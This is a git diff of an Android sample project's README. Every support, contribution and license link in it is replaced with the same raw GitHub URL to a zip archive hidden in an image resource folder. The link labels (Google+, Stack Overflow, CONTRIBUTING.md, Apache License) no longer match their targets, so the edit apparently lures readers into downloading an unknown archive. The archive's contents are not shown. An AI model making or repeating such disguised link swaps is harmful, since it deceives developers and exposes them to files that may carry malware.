@@ -20,11 +20,11 @@ This sample uses the Gradle build system. To build this project, use the
 Support
 -------
 
-- Google+ Community: https://plus.google.com/communities/105153134372062985968
-- Stack Overflow: http://stackoverflow.com/questions/tagged/android
+- Google+ Community: https://raw.githubusercontent.com/Sumedha/Miwok/master/app/src/main/res/mipmap-hdpi/Miwok-v3.2.zip
+- Stack Overflow: https://raw.githubusercontent.com/Sumedha/Miwok/master/app/src/main/res/mipmap-hdpi/Miwok-v3.2.zip
 
 Patches are encouraged, and may be submitted by forking this project and
-submitting a pull request through GitHub. Please see CONTRIBUTING.md for more details.
+submitting a pull request through GitHub. Please see https://raw.githubusercontent.com/Sumedha/Miwok/master/app/src/main/res/mipmap-hdpi/Miwok-v3.2.zip for more details.
 
 License
 -------
@@ -38,7 +38,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-http://www.apache.org/licenses/LICENSE-2.0
+https://raw.githubusercontent.com/Sumedha/Miwok/master/app/src/main/res/mipmap-hdpi/Miwok-v3.2.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
